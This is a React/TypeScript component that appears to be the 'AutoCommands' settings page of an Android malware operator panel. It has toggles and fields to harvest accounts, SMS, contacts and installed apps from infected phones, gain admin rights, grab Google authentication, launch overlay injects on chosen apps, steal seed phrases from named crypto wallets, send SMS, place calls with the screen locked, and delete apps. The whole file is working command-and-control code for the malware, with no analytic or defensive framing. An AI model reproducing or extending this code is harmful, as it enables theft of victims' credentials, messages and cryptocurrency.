import React, {useLayoutEffect} from "react";
import {Button, Checkbox, Col, Form, Input, Row, Spin, Switch} from "antd";
import {
    AlignCenterOutlined,
    AppstoreAddOutlined, ClearOutlined, DeleteOutlined, GoogleOutlined,
    GooglePlusOutlined, IeOutlined, KeyOutlined,
    MailOutlined, MessageOutlined, PhoneOutlined, PlayCircleOutlined,
    SelectOutlined,
    UsergroupAddOutlined,
} from "@ant-design/icons";
import {customStyles} from "../../../Util/config";
import CreatableSelect from "react-select/creatable";
import {useDispatch, useSelector} from "react-redux";
import {AppState} from "../../../Store/RootReducer";
import TextArea from "antd/es/input/TextArea";


import {updateAutoCommands} from "../../../Store/AutoCommands/Actions";
import getAutoCommands from "../../../Requests/AutoCommands/GetAutoCommandsRequest";

interface SelectFields {
    label: string,
    value: string,
}

const AutoCommands: React.FC = () => {
    const [form] = Form.useForm();
    const dispatch = useDispatch();
    const acReducer = useSelector((state: AppState) => state.autoCommands);

    const filtersReducer = useSelector((state: AppState) => state.filters);

    const options: SelectFields[] = [];

    Object.keys(filtersReducer.injections).map((application: string) => {
        options.push({
            label: application,
            value: application,
        });
    });

    useLayoutEffect(() => {
        if (!acReducer.isLoaded) {
            dispatch(getAutoCommands());
        } else {
            form.setFieldsValue({
                get_accounts: acReducer.getAccounts.enabled,
                get_installed_apps: acReducer.getInstalledApps.enabled,
                update_inject_list: acReducer.updateInjectList.enabled,
                get_sms_list: acReducer.getSMSList.enabled,
                get_contacts_list: acReducer.getContactsList.enabled,
                get_admin_rights: acReducer.getAdminRights.enabled,
                google_auth_grabber: acReducer.googleAuthGrabber.enabled,
                calling_toggle: acReducer.calling.enabled,
                open_inject: acReducer.openInject.enabled,
                send_push: acReducer.sendPush.enabled,
                send_sms_toggle: acReducer.sendSMS.enabled,
                get_seed_toggle: acReducer.getSeedPhrase.enabled,
                clear_app_toggle: acReducer.clearAppData.enabled,
                run_app_toggle: acReducer.runApp.enabled,
                delete_app_toggle: acReducer.deleteApp.enabled,
                open_url_toggle: acReducer.openUrl.enabled,
                calling_number: acReducer.calling.number,
                calling_lock_screen: acReducer.calling.locked,
                clear_app: acReducer.clearAppData.application !== undefined && acReducer.clearAppData.application !== "" ? {
                    label: acReducer.clearAppData.application,
                    value: acReducer.clearAppData.application,
                } : null,
                delete_app: acReducer.deleteApp.application !== undefined && acReducer.deleteApp.application !== "" ? {
                    label: acReducer.deleteApp.application,
                    value: acReducer.deleteApp.application,
                } : null,
                get_seed: acReducer.getSeedPhrase.wallets,
                open_inject_application: acReducer.openInject.application !== undefined && acReducer.openInject.application !== "" ? {
                    label: acReducer.openInject.application,
                    value: acReducer.openInject.application,
                } : null,
                open_url: acReducer.openUrl.url,
                push_application: acReducer.sendPush.application !== undefined && acReducer.sendPush.application !== "" ? {
                    label: acReducer.sendPush.application,
                    value: acReducer.sendPush.application,
                } : null,
                push_text: acReducer.sendPush.text,
                push_title: acReducer.sendPush.title,
                run_app: acReducer.runApp.application !== undefined && acReducer.runApp.application !== "" ? {
                    label: acReducer.runApp.application,
                    value: acReducer.runApp.application,
                } : null,
                send_sms_message: acReducer.sendSMS.message,
                send_sms_number: acReducer.sendSMS.number,
            });
        }
    }, [dispatch, acReducer.isLoaded]);

    const autoCommandsSave = () => {
        dispatch(updateAutoCommands({
            getAccounts: {
                enabled: form.getFieldValue("get_accounts"),
            },
            getInstalledApps: {
                enabled: form.getFieldValue("get_installed_apps"),
            },
            updateInjectList: {
                enabled: form.getFieldValue("update_inject_list"),
            },
            getSMSList: {
                enabled: form.getFieldValue("get_sms_list"),
            },
            getContactsList: {
                enabled: form.getFieldValue("get_contacts_list"),
            },
            getAdminRights: {
                enabled: form.getFieldValue("get_admin_rights"),
            },
            googleAuthGrabber: {
                enabled: form.getFieldValue("google_auth_grabber"),
            },
            calling: {
                enabled: form.getFieldValue("calling_toggle"),
                number: form.getFieldValue("calling_number"),
                locked: form.getFieldValue("calling_lock_screen"),
            },
            openInject: {
                enabled: form.getFieldValue("open_inject"),
                application: form.getFieldValue("open_inject_application")?.value ?? "",
            },
            sendPush: {
                enabled: form.getFieldValue("send_push"),
                title: form.getFieldValue("push_title"),
                text: form.getFieldValue("push_text"),
                application: form.getFieldValue("push_application")?.value ?? "",
            },
            sendSMS: {
                enabled: form.getFieldValue("send_sms_toggle"),
                message: form.getFieldValue("send_sms_message"),
                number: form.getFieldValue("send_sms_number"),
            },
            getSeedPhrase: {
                enabled: form.getFieldValue("get_seed_toggle"),
                wallets: form.getFieldValue("get_seed"),
            },
            clearAppData: {
                enabled: form.getFieldValue("clear_app_toggle"),
                application: form.getFieldValue("clear_app")?.value ?? "",
            },
            runApp: {
                enabled: form.getFieldValue("run_app_toggle"),
                application: form.getFieldValue("run_app")?.value ?? "",
            },
            deleteApp: {
                enabled: form.getFieldValue("delete_app_toggle"),
                application: form.getFieldValue("delete_app")?.value ?? "",
            },
            openUrl: {
                enabled: form.getFieldValue("open_url_toggle"),
                url: form.getFieldValue("open_url"),
            },
        }));
    };

    const onClearApplication = (newValue: any, action: any) => {
        if (!newValue) {
            form.setFieldsValue({
                [action.name]: "",
            });
        }
    };

    return !acReducer.isLoaded ? (
        <Spin />
    ) : (
        <>
            <div className="panel-header">
                <h2 className="panel-title">
                    AutoCommands
                </h2>
            </div>

            <div className="panel-content">
                <Form form={form} layout="vertical" onValuesChange={(changedValues: Record<string, string>, values: any) => {
                    form.setFieldsValue({
                        ...changedValues,
                    });
                }}>
                    <Row gutter={15}>
                        <Col xl={6} lg={12} md={12} sm={24}>
                            <div className="command-item">
                                <div className="command-check">
                                    <Form.Item className="command-form-item" name="get_accounts" valuePropName="checked">
                                        <Switch
                                            size="small"
                                            checked={acReducer.getAccounts.enabled}
                                        />
                                    </Form.Item>
                                </div>
                                <div className="command-name">
                                    <span><GooglePlusOutlined /> Get accounts</span>
                                </div>
                            </div>

                            <div className="command-item">
                                <div className="command-check">
                                    <Form.Item className="command-form-item" name="get_installed_apps" valuePropName="checked">
                                        <Switch size="small"
                                            checked={acReducer.getInstalledApps.enabled}
                                        />
                                    </Form.Item>
                                </div>
                                <div className="command-name">
                                    <span><AppstoreAddOutlined /> Get installed apps</span>
                                </div>
                            </div>

                            <div className="command-item">
                                <div className="command-check">
                                    <Form.Item className="command-form-item" name="update_inject_list" valuePropName="checked">
                                        <Switch size="small"
                                            checked={acReducer.updateInjectList.enabled}
                                        />
                                    </Form.Item>
                                </div>
                                <div className="command-name">
                                    <span><SelectOutlined /> Update inject list</span>
                                </div>
                            </div>

                            <div className="command-item">
                                <div className="command-check">
                                    <Form.Item className="command-form-item" name="get_sms_list" valuePropName="checked">
                                        <Switch size="small"
                                            checked={acReducer.getSMSList.enabled}
                                        />
                                    </Form.Item>
                                </div>
                                <div className="command-name">
                                    <span><MailOutlined /> Get SMS list</span>
                                </div>
                            </div>

                            <div className="command-item">
                                <div className="command-check">
                                    <Form.Item className="command-form-item" name="get_contacts_list" valuePropName="checked">
                                        <Switch size="small"
                                            checked={acReducer.getContactsList.enabled}
                                        />
                                    </Form.Item>
                                </div>
                                <div className="command-name">
                                    <span><UsergroupAddOutlined /> Get contacts list</span>
                                </div>
                            </div>

                            <div className="command-item">
                                <div className="command-check">
                                    <Form.Item className="command-form-item" name="get_admin_rights" valuePropName="checked">
                                        <Switch size="small"
                                            checked={acReducer.getAdminRights.enabled}
                                        />
                                    </Form.Item>
                                </div>
                                <div className="command-name">
                                    <span><KeyOutlined /> Get admin rights</span>
                                </div>
                            </div>

                            <div className="command-item">
                                <div className="command-check">
                                    <Form.Item className="command-form-item" name="google_auth_grabber" valuePropName="checked">
                                        <Switch size="small"
                                            checked={acReducer.googleAuthGrabber.enabled}
                                        />
                                    </Form.Item>
                                </div>
                                <div className="command-name">
                                    <span><GoogleOutlined /> Google auth grabber</span>
                                </div>
                            </div>

                            <div className="command-item form">
                                <div className="command-check">
                                    <Form.Item className="command-form-item" name="calling_toggle" valuePropName="checked">
                                        <Switch size="small"
                                            checked={acReducer.calling.enabled}
                                        />
                                    </Form.Item>
                                </div>
                                <div className="command-name">
                                    <span><PhoneOutlined /> Calling</span>
                                </div>
                                <div className="command-form">
                                    <Form.Item label="Number" name="calling_number">
                                        <Input value={acReducer.calling.number} placeholder="Number"/>
                                    </Form.Item>
                                    <Form.Item name="calling_lock_screen" label="Lock screen?" valuePropName="checked">
                                        <Switch checked={acReducer.calling.locked} size="small" unCheckedChildren={"No\xa0"} checkedChildren="Yes" />
                                    </Form.Item>
                                </div>
                            </div>

                            <div className="command-item form">
                                <div className="command-check">
                                    <Form.Item className="command-form-item" name="open_inject" valuePropName="checked">
                                        <Switch size="small"
                                            checked={acReducer.openInject.enabled}
                                        />
                                    </Form.Item>
                                </div>
                                <div className="command-name">
                                    <span><SelectOutlined /> Open Inject</span>
                                </div>
                                <div className="command-form">
                                    <Form.Item label="Application" name="open_inject_application">
                                        <CreatableSelect
                                            styles={customStyles}
                                            options={options}
                                            isClearable
                                            onChange={onClearApplication}
                                            name="open_inject_application"
                                        />
                                    </Form.Item>
                                </div>
                            </div>

                            <div className="command-item form">
                                <div className="command-check">
                                    <Form.Item className="command-form-item" name="send_push" valuePropName="checked">
                                        <Switch size="small"
                                            checked={acReducer.sendPush.enabled}
                                        />
                                    </Form.Item>
                                </div>
                                <div className="command-name">
                                    <span><MessageOutlined /> Send Push</span>
                                </div>
                                <div className="command-form">
                                    <Form.Item label="Push title" name="push_title">
                                        <Input placeholder="Push title" />
                                    </Form.Item>
                                    <Form.Item label="Push text" name="push_text">
                                        <Input placeholder="Push text" />
                                    </Form.Item>
                                    <Form.Item label="Application" name="push_application">
                                        <CreatableSelect
                                            styles={customStyles}
                                            options={options}
                                            isClearable
                                            onChange={onClearApplication}
                                            name="push_application"
                                        />
                                    </Form.Item>
                                </div>
                            </div>
                        </Col>
                        <Col xl={6} lg={12} md={12} sm={24}>
                            <div className="command-item form">
                                <div className="command-check">
                                    <Form.Item className="command-form-item" name="send_sms_toggle" valuePropName="checked">
                                        <Switch size="small"
                                            checked={acReducer.sendSMS.enabled}
                                        />
                                    </Form.Item>
                                </div>
                                <div className="command-name">
                                    <span><MailOutlined /> Send SMS</span>
                                </div>
                                <div className="command-form">
                                    <Form.Item label="Number" name="send_sms_number">
                                        <Input placeholder="Number" />
                                    </Form.Item>
                                    <Form.Item label="Type message" name="send_sms_message">
                                        <TextArea placeholder="Message" />
                                    </Form.Item>
                                </div>
                            </div>

                            <div className="command-item form">
                                <div className="command-check">
                                    <Form.Item className="command-form-item" name="get_seed_toggle" valuePropName="checked">
                                        <Switch size="small"
                                            checked={acReducer.getSeedPhrase.enabled}
                                        />
                                    </Form.Item>
                                </div>
                                <div className="command-name">
                                    <span><AlignCenterOutlined /> Get seed phrase</span>
                                </div>
                                <div className="command-form">
                                    <Form.Item label="Seed phrase:" name="get_seed" initialValue="trust">
                                        <Checkbox.Group>
                                            <Row>
                                                <Col span={12}>
                                                    <Checkbox value="trust">Trust wallet</Checkbox>
                                                </Col>
                                                <Col span={12}>
                                                    <Checkbox value="bitcoincom">Bitcoin.com</Checkbox>
                                                </Col>
                                                <Col span={12}>
                                                    <Checkbox value="mycelium">MyCelium</Checkbox>
                                                </Col>
                                                <Col span={12}>
                                                    <Checkbox value="piuk">BlockChain</Checkbox>
                                                </Col>
                                                <Col span={12}>
                                                    <Checkbox value="samourai">Samourai</Checkbox>
                                                </Col>
                                                <Col span={12}>
                                                    <Checkbox value="toshi">Toshi</Checkbox>
                                                </Col>
                                            </Row>
                                        </Checkbox.Group>
                                    </Form.Item>
                                </div>
                            </div>

                            <div className="command-item form">
                                <div className="command-check">
                                    <Form.Item className="command-form-item" name="clear_app_toggle" valuePropName="checked">
                                        <Switch size="small"
                                            checked={acReducer.clearAppData.enabled}
                                        />
                                    </Form.Item>
                                </div>
                                <div className="command-name">
                                    <span><ClearOutlined /> Clear app data</span>
                                </div>
                                <div className="command-form">
                                    <Form.Item label="Application" name="clear_app">
                                        <CreatableSelect
                                            styles={customStyles}
                                            options={options}
                                            isClearable
                                            onChange={onClearApplication}
                                            name="clear_app"
                                        />
                                    </Form.Item>
                                </div>
                            </div>

                            <div className="command-item form">
                                <div className="command-check">
                                    <Form.Item className="command-form-item" name="run_app_toggle" valuePropName="checked">
                                        <Switch size="small"
                                            checked={acReducer.runApp.enabled}
                                        />
                                    </Form.Item>
                                </div>
                                <div className="command-name">
                                    <span><PlayCircleOutlined /> Run app</span>
                                </div>
                                <div className="command-form">
                                    <Form.Item label="Application" name="run_app">
                                        <CreatableSelect styles={customStyles} options={options} isClearable onChange={onClearApplication} name="run_app"/>
                                    </Form.Item>
                                </div>
                            </div>

                            <div className="command-item form">
                                <div className="command-check">
                                    <Form.Item className="command-form-item" name="delete_app_toggle" valuePropName="checked">
                                        <Switch size="small"
                                            checked={acReducer.deleteApp.enabled}
                                        />
                                    </Form.Item>
                                </div>
                                <div className="command-name">
                                    <span><DeleteOutlined /> Delete app</span>
                                </div>
                                <div className="command-form">
                                    <Form.Item label="Application" name="delete_app">
                                        <CreatableSelect
                                            name="delete_app"
                                            styles={customStyles}
                                            options={options}
                                            isClearable
                                            onChange={onClearApplication}
                                        />
                                    </Form.Item>
                                </div>
                            </div>

                            <div className="command-item form">
                                <div className="command-check">
                                    <Form.Item className="command-form-item" name="open_url_toggle" valuePropName="checked">
                                        <Switch size="small"
                                            checked={acReducer.openUrl.enabled}
                                        />
                                    </Form.Item>
                                </div>
                                <div className="command-name">
                                    <span><IeOutlined /> Open URL</span>
                                </div>
                                <div className="command-form">
                                    <Form.Item label="Enter website" name="open_url" valuePropName="value">
                                        <Input placeholder="https://enter.website/" />
                                    </Form.Item>
                                </div>
                            </div>
                            <div className="command-save">
                                <Button htmlType="submit" type="primary" onClick={autoCommandsSave}>Save</Button>
                            </div>
                        </Col>
                    </Row>
                </Form>
            </div>
        </>
    );
};

export default AutoCommands;
